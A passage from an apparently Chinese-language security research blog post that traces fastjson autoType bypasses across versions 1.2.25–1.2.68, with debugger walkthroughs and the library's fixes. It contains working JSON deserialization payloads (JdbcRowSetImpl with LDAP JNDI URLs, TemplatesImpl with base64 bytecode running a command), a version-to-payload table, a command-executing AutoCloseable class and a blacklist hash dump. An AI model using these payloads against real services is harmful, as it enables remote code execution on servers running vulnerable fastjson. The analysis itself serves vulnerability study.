class="literal">null</span>) &#123;  </span><br><span class="line">        <span class="keyword">return</span> clazz;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">if</span> (className.charAt(<span class="number">0</span>) == <span class="string">&#x27;[&#x27;</span>) &#123;  </span><br><span class="line">        Class&lt;?&gt; componentType = loadClass(className.substring(<span class="number">1</span>), classLoader);  </span><br><span class="line">        <span class="keyword">return</span> Array.newInstance(componentType, <span class="number">0</span>).getClass();  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">if</span> (className.startsWith(<span class="string">&quot;L&quot;</span>) &amp;&amp; className.endsWith(<span class="string">&quot;;&quot;</span>)) &#123;  </span><br><span class="line">        <span class="type">String</span> <span class="variable">newClassName</span> <span class="operator">=</span> className.substring(<span class="number">1</span>, className.length() - <span class="number">1</span>);  </span><br><span class="line">        <span class="keyword">return</span> loadClass(newClassName, classLoader);  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">try</span> &#123;  </span><br><span class="line">        <span class="keyword">if</span> (classLoader != <span class="literal">null</span>) &#123;  </span><br><span class="line">            clazz = classLoader.loadClass(className);  </span><br><span class="line">            mappings.put(className, clazz);  </span><br><span class="line">  </span><br><span class="line">            <span class="keyword">return</span> clazz;  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125; <span class="keyword">catch</span> (Throwable e) &#123;  </span><br><span class="line">        e.printStackTrace();  </span><br><span class="line">        <span class="comment">// skip  </span></span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">try</span> &#123;  </span><br><span class="line">        <span class="type">ClassLoader</span> <span class="variable">contextClassLoader</span> <span class="operator">=</span> Thread.currentThread().getContextClassLoader();  </span><br><span class="line">  </span><br><span class="line">        <span class="keyword">if</span> (contextClassLoader != <span class="literal">null</span> &amp;&amp; contextClassLoader != classLoader) &#123;  </span><br><span class="line">            clazz = contextClassLoader.loadClass(className);  </span><br><span class="line">            mappings.put(className, clazz);  </span><br><span class="line">  </span><br><span class="line">            <span class="keyword">return</span> clazz;  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125; <span class="keyword">catch</span> (Throwable e) &#123;  </span><br><span class="line">        <span class="comment">// skip  </span></span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">try</span> &#123;  </span><br><span class="line">        clazz = Class.forName(className);  </span><br><span class="line">        mappings.put(className, clazz);  </span><br><span class="line">  </span><br><span class="line">        <span class="keyword">return</span> clazz;  </span><br><span class="line">    &#125; <span class="keyword">catch</span> (Throwable e) &#123;  </span><br><span class="line">        <span class="comment">// skip  </span></span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">return</span> clazz;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>不难发现mappings实际上是对已经加载过的类的缓存. 也就是说, 被加载过的类都会存放在这里, 下次又需要加载的时候, 直接取出来用, 提高效率.<br>&#x3D;&#x3D;如何把我们的恶意类插入到mappings中呢?&#x3D;&#x3D; </p><p>我们返回到之前的调试过程思考: 当json的键为<code>@type</code>时, 它所对应的值(类名)会经过checkAutoType的审查, 但如果此时的恶意类作为一个其他类的Field(同样会被反序列化),或者说它的键名不是<code>@type</code>, 是否会经过checkAutoType呢?<br>全局搜索<code>TypeUtils.loadClass</code>, 看看除了checkAutoType还有哪里调用<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250531155451.png" alt="image.png"><br>如上图, 可控的只有四个, 而下面三个都是在checkAutoType中的, 无法利用, 我们聚焦于&#x3D;&#x3D;<code>MiscCodec</code>&#x3D;&#x3D;这个类中, 看一下这个类的定义<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250531155729.png" alt="image.png"></p><p>很明显这是一个反序列化器的实现类, 这个反序列化器实现了对一些杂项类的反序列化, 其中包括<code>Class.class</code>:</p><p><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250531160027.png" alt="image.png"><br>对于一个<code>Class.class</code>, 该反序列化器直接调用<code>TypeUtils.loadClass</code>加载<code>strVal</code>, 那我们看一下<code>strVal</code>是什么<br>往上翻可以找到这个变量的来历<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250531161326.png" alt="image.png"><br>实际上就是解析json中下一条键为”val”的值, 解析到的值String时, 直接赋值给strVal,<br>也就是说如果我们构造一个json字符串:</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;java.lang.Class&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;val&quot;</span><span class="punctuation">:</span><span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>虽然checkAutoType禁用了<code>com.sun.</code>, 但此时并不经过checkAutoType, <code>com.sun.rowset.JdbcRowSetImpl</code>会被<code>TypeUtils.loadClass</code>直接被加载一次, 然后把这个class缓存到mappings, 下次需要加载时就不经过checkAutoType直接从mappings中get了<br>于是就有了以下payload:</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;a&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;java.lang.Class&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;val&quot;</span><span class="punctuation">:</span><span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;b&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;dataSourceName&quot;</span><span class="punctuation">:</span><span class="string">&quot;ldap://127.0.0.1:1389/ubjazx&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;autoCommit&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">true</span></span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>当然, 也可以</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;a&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;java.lang.Class&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;val&quot;</span><span class="punctuation">:</span><span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;b&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;_bytecodes&quot;</span><span class="punctuation">:</span><span class="punctuation">[</span><span class="string">&quot;yv66vgAAADQAJgoAAwAPBwAhBwASAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAAR0ZXN0AQAMSW5uZXJDbGFzc2VzAQAgTEZhc3Rqc29uV2l0aFRlbXBsYXRlc0ltcGwkdGVzdDsBAApTb3VyY2VGaWxlAQAeRmFzdGpzb25XaXRoVGVtcGxhdGVzSW1wbC5qYXZhDAAEAAUHABMBAB5GYXN0anNvbldpdGhUZW1wbGF0ZXNJbXBsJHRlc3QBABBqYXZhL2xhbmcvT2JqZWN0AQAZRmFzdGpzb25XaXRoVGVtcGxhdGVzSW1wbAEACDxjbGluaXQ+AQARamF2YS9sYW5nL1J1bnRpbWUHABUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7DAAXABgKABYAGQEABGNhbGMIABsBAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7DAAdAB4KABYAHwEAE240YzE0NTY4MDc2MjAwNjUxMDABABVMbjRjMTQ1NjgwNzYyMDA2NTEwMDsBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0BwAjCgAkAA8AIQACACQAAAAAAAIAAQAEAAUAAQAGAAAALwABAAEAAAAFKrcAJbEAAAACAAcAAAAGAAEAAAARAAgAAAAMAAEAAAAFAAkAIgAAAAgAFAAFAAEABgAAABYAAgAAAAAACrgAGhIctgAgV7EAAAAAAAIADQAAAAIADgALAAAACgABAAIAEAAKAAk=&quot;</span><span class="punctuation">]</span><span class="punctuation">,</span>        <span class="attr">&quot;_name&quot;</span><span class="punctuation">:</span><span class="string">&quot;a.b&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;_tfactory&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span> </span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;_outputProperties&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>这个方法通杀<code>1.2.25-1.2.47</code>版本, 在AutoType默认不开启时可用</p><h3 id="AutoType开启时的绕过-利用字符前缀"><a href="#AutoType开启时的绕过-利用字符前缀" class="headerlink" title="AutoType开启时的绕过 利用字符前缀"></a>AutoType开启时的绕过 利用字符前缀</h3><p>当AutoType开启时(<code>AutoTypeSupport == true</code>), 还有另一种绕过手法, 我们回去看checkAutoType的逻辑, 当开启AutoTypeSupport或设置了期望类型时, 会走到这一步, 直接调用了loadClass<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250531211345.png" alt="image.png"></p><p>但在这之前是过了一次黑名单的, 为了绕过黑名单,  在loadClass中有以下操作:<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250531211721.png" alt="image.png"></p><p>当类名以<code>L</code>开头<code>;</code>结尾时, 去掉这两个字符然后loadClass, 注意此时是递归调用的, 因此可用有很多层<code>L</code>开头<code>;</code>结尾去包裹恶意类, 都是可用正常解析的, 同理<code>[</code>开头也有此操作<br>因此当开启了AutoType时, 有以下payload</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;LLLLcom.sun.rowset.JdbcRowSetImpl;;;;&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;dataSourceName&quot;</span><span class="punctuation">:</span><span class="string">&quot;ldap://127.0.0.1:1389/knwwcb&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;autoCommit&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">true</span></span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>而对于<code>[</code>如果直接使用<code>[com.sun.rowset.JdbcRowSetImpl</code>会报错:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;@type&quot;:&quot;[com.sun.rowset.JdbcRowSetImpl&quot;, &quot;dataSourceName&quot;:&quot;ldap://127.0.0.1:1389/knwwcb&quot;, &quot;autoCommit&quot;:true&#125;</span><br><span class="line">Exception in thread &quot;main&quot; com.alibaba.fastjson.JSONException: exepct &#x27;[&#x27;, but ,, pos 42, json : &#123;&quot;@type&quot;:&quot;[com.sun.rowset.JdbcRowSetImpl&quot;, &quot;dataSourceName&quot;:&quot;ldap://127.0.0.1:1389/knwwcb&quot;, &quot;autoCommit&quot;:true&#125;</span><br><span class="line">at com.alibaba.fastjson.parser.DefaultJSONParser.parseArray(DefaultJSONParser.java:669)</span><br><span class="line">at com.alibaba.fastjson.serializer.ObjectArrayCodec.deserialze(ObjectArrayCodec.java:177)</span><br><span class="line">at com.alibaba.fastjson.parser.DefaultJSONParser.parseObject(DefaultJSONParser.java:368)</span><br><span class="line">at com.alibaba.fastjson.parser.DefaultJSONParser.parse(DefaultJSONParser.java:1327)</span><br><span class="line">at com.alibaba.fastjson.parser.DefaultJSONParser.parse(DefaultJSONParser.java:1293)</span><br><span class="line">at com.alibaba.fastjson.JSON.parse(JSON.java:137)</span><br><span class="line">at com.alibaba.fastjson.JSON.parse(JSON.java:128)</span><br><span class="line">at FastjsonWithJdbcRowSetImpl.withAutoTypeSupportAttackVersion_1_2_25(FastjsonWithJdbcRowSetImpl.java:41)</span><br><span class="line">at FastjsonWithJdbcRowSetImpl.main(FastjsonWithJdbcRowSetImpl.java:10)</span><br></pre></td></tr></table></figure><p>打断点看看哪里出错了<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250531213537.png" alt="image.png"><br>在扫描完类名后需要一个<code>[</code>, 而当前的token是16(可用点进去看, 16代表逗号<code>,</code>), 那我们在逗号前加<code>[</code>即可<br>之后又会报错<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250531213830.png" alt="image.png"><br>那再加一个<code>&#123;</code>来规避这个报错<br>最后payload就是这样</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;[com.sun.rowset.JdbcRowSetImpl&quot;</span><span class="punctuation">[</span><span class="punctuation">&#123;</span><span class="punctuation">,</span> <span class="attr">&quot;dataSourceName&quot;</span><span class="punctuation">:</span><span class="string">&quot;ldap://127.0.0.1:1389/knwwcb&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;autoCommit&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">true</span></span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>当然也可以尝试之前的TemplatesImpl</p><p>经过尝试: 对于使用<code>L ;</code>绕过, 1.2.43版本中被修复了, 但这个版本依然可以使用<code>&#123;&quot;@type&quot;:&quot;[com.sun.rowset.JdbcRowSetImpl&quot;[&#123;, &quot;dataSourceName&quot;:&quot;ldap://127.0.0.1:1389/knwwcb&quot;, &quot;autoCommit&quot;:true&#125;</code>这个payload, 直到1.2.44被修复</p><p>梳理出payload适用版本:</p><p>fastjson &lt; 1.2.43</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;LLLLcom.sun.rowset.JdbcRowSetImpl;;;;&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;dataSourceName&quot;</span><span class="punctuation">:</span><span class="string">&quot;ldap://127.0.0.1:1389/knwwcb&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;autoCommit&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">true</span></span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>fastjson &lt; 1.2.44</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;[com.sun.rowset.JdbcRowSetImpl&quot;</span><span class="punctuation">[</span><span class="punctuation">&#123;</span><span class="punctuation">,</span> <span class="attr">&quot;dataSourceName&quot;</span><span class="punctuation">:</span><span class="string">&quot;ldap://127.0.0.1:1389/knwwcb&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;autoCommit&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">true</span></span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>1.2.25 &lt;&#x3D; fastjson &lt; 1.2.48</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;a&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;java.lang.Class&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;val&quot;</span><span class="punctuation">:</span><span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;b&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;dataSourceName&quot;</span><span class="punctuation">:</span><span class="string">&quot;ldap://127.0.0.1:1389/ubjazx&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;autoCommit&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">true</span></span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>我们来看一下这三个版本是怎么修复的</p><h3 id="fastjson-1-2-42的修复"><a href="#fastjson-1-2-42的修复" class="headerlink" title="fastjson 1.2.42的修复"></a>fastjson 1.2.42的修复</h3><p>其实在1.2.42版本中对于<code>L ;</code>绕过已经修复过一次了<br>版本改到1.2.42, 使用<code>Lcom.sun.rowset.JdbcRowSetImpl;</code>这个类名去打<br>直接去看TypeUtils.loadClass<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250601000340.png" alt="image.png"><br>可以看见先对className的第一个字母和最后一个字母做了一次哈希, 如果值为<code>0x9198507b5af98f0L</code>则切割掉这两个字符, 很明显就是不允许类名前面为<code>L</code>后面为<code>;</code><br>这个版本切割得到的类名也不再是在明文的黑名单中去比较, 而是改成了哈希值列表<code>denyHashCodes</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">0 = -8720046426850100497</span><br><span class="line">1 = -8109300701639721088</span><br><span class="line">2 = -7966123100503199569</span><br><span class="line">3 = -7766605818834748097</span><br><span class="line">4 = -6835437086156813536</span><br><span class="line">5 = -4837536971810737970</span><br><span class="line">6 = -4082057040235125754</span><br><span class="line">7 = -2364987994247679115</span><br><span class="line">8 = -1872417015366588117</span><br><span class="line">10 = -190281065685395680</span><br><span class="line">9 = -254670111376247151</span><br><span class="line">11 = 33238344207745342</span><br><span class="line">12 = 313864100207897507</span><br><span class="line">13 = 1203232727967308606</span><br><span class="line">14 = 1502845958873959152</span><br><span class="line">15 = 3547627781654598988</span><br><span class="line">16 = 3730752432285826863</span><br><span class="line">17 = 3794316665763266033</span><br><span class="line">18 = 4147696707147271408</span><br><span class="line">19 = 5347909877633654828</span><br><span class="line">20 = 5450448828334921485</span><br><span class="line">21 = 5751393439502795295</span><br><span class="line">22 = 5944107969236155580</span><br><span class="line">23 = 6742705432718011780</span><br><span class="line">24 = 7179336928365889465</span><br><span class="line">25 = 7442624256860549330</span><br><span class="line">26 = 8838294710098435315</span><br></pre></td></tr></table></figure><p>把我们的<code>Lcom.sun.rowset.JdbcRowSetImpl;</code>净化为<code>com.sun.rowset.JdbcRowSetImpl</code>再hash后去在中查找, 很明显denyHashCodes中是有这个类对应的hash值的, 但是这样的过滤无济于事, 前面说过, loadClass在处理<code>L ;</code>时是递归的, 这里双写或者多加几层就绕过去了</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;LLLLcom.sun.rowset.JdbcRowSetImpl;;;;&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;dataSourceName&quot;</span><span class="punctuation">:</span><span class="string">&quot;ldap://127.0.0.1:1389/knwwcb&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;autoCommit&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">true</span></span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>还有这个denyHashCodes列表, 在网上也有大牛进行了爆破, 参考</p><p><strong><a href="https://github.com/LeadroyaL/fastjson-blacklist">fastjson-blacklist</a></strong></p><h3 id="fastjson-1-2-43的修复"><a href="#fastjson-1-2-43的修复" class="headerlink" title="fastjson 1.2.43的修复"></a>fastjson 1.2.43的修复</h3><p>这个版本对前面的双写又进行了修复<br>版本改到1.2.43, 直接去看TypeUtils.loadClass<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250531234452.png" alt="image.png"></p><p>在checkAutoType又中添加了一层判断, 在出现<code>L</code>开头, <code>;</code>结尾的情况下, 出现<code>LL</code>开头就抛出错误, 这样就不能多层<code>L ;</code>绕过了. 但是别忘了, 我们还可以嵌套一层<code>[</code>来绕过</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;[com.sun.rowset.JdbcRowSetImpl&quot;</span><span class="punctuation">[</span><span class="punctuation">&#123;</span><span class="punctuation">,</span> <span class="attr">&quot;dataSourceName&quot;</span><span class="punctuation">:</span><span class="string">&quot;ldap://127.0.0.1:1389/knwwcb&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;autoCommit&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">true</span></span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>或者</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;[Lcom.sun.rowset.JdbcRowSetImpl;&quot;</span><span class="punctuation">[</span><span class="punctuation">&#123;</span><span class="punctuation">,</span> <span class="attr">&quot;dataSourceName&quot;</span><span class="punctuation">:</span><span class="string">&quot;ldap://127.0.0.1:1389/knwwcb&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;autoCommit&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">true</span></span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><h3 id="fastjson-1-2-44的修复"><a href="#fastjson-1-2-44的修复" class="headerlink" title="fastjson 1.2.44的修复"></a>fastjson 1.2.44的修复</h3><p>同样地, 拿上个版本的payload去打, 看看怎么回事<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250601003546.png" alt="image.png"><br>很明显这里不让<code>[</code>开头了, 第907行也不让<code>;</code>结尾了, 这条路算是堵死了, 当然了, 这个版本我们依然可以使用上面的缓存机制绕过</p><h3 id="fastjson-1-2-48的修复"><a href="#fastjson-1-2-48的修复" class="headerlink" title="fastjson 1.2.48的修复"></a>fastjson 1.2.48的修复</h3><p>在这个版本我们依旧尝试之前的缓存绕过来打, 看看报什么错, 由于可控的<code>mappings.put</code>是在TypeUtils.loadClass中的, 我们把断点打在loadClass中,<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250601135215.png" alt="image.png"><br>如上图. 可以看见这里加了一个参数<code>cache</code>默认为<code>false</code>, 不进行缓存, 往回调看前一个调用栈<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250601135346.png" alt="image.png"><br>cache的值是写死在MiscCodec类中的, 导致不缓存加载过的危险类</p><h2 id="fastjson-1-2-68-期望类利用-AutoCloseable"><a href="#fastjson-1-2-68-期望类利用-AutoCloseable" class="headerlink" title="fastjson 1.2.68 期望类利用(AutoCloseable)"></a>fastjson 1.2.68 期望类利用(AutoCloseable)</h2><p>在1.2.48中已经修复了缓存机制的绕过, 而在1.2.68中又爆出了新的利用方式, 利用expectClass<br>实现了<code>java.lang.AutoCloseable</code>接口的类可以被反序列化</p><p>&#x3D;&#x3D;为什么<code>java.lang.AutoCloseable</code>的实现类会被利用?&#x3D;&#x3D;<br>一些文件操作的类是实现了<code>java.lang.AutoCloseable</code>接口的, 在浅蓝师傅的文章中提到可以去挖掘文件操作的类作为新的gadget:</p><p><a href="https://b1ue.cn/archives/382.html">fastjson 1.2.68 autotype bypass 反序列化漏洞 gadget 的一种挖掘思路</a></p><p>本篇只讨论fastjosn本身的绕过, 不研究gadget(懒..</p><p>这里用下面的demo来测试</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">AttackVersion_1_2_68</span><span class="params">(String cmd)</span> &#123;  </span><br><span class="line">    <span class="type">String</span> <span class="variable">poc</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;java.lang.AutoCloseable\&quot;,\&quot;@type\&quot;:\&quot;EvilClass.VulAutoCloseable\&quot;,\&quot;cmd\&quot;:\&quot;&quot;</span> + cmd + <span class="string">&quot;\&quot;&#125;&quot;</span>;  </span><br><span class="line">    System.out.println(poc);  </span><br><span class="line">    <span class="keyword">return</span> poc;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> EvilClass;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">VulAutoCloseable</span> <span class="keyword">implements</span> <span class="title class_">AutoCloseable</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">VulAutoCloseable</span><span class="params">(String cmd)</span> &#123;  </span><br><span class="line">        <span class="keyword">try</span> &#123;  </span><br><span class="line">            Runtime.getRuntime().exec(cmd);  </span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;  </span><br><span class="line">            e.printStackTrace();  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="meta">@Override</span>  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">close</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;  </span><br><span class="line">  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>&#x3D;&#x3D;<code>java.lang.AutoCloseable</code>存在于默认的mapings中&#x3D;&#x3D;, 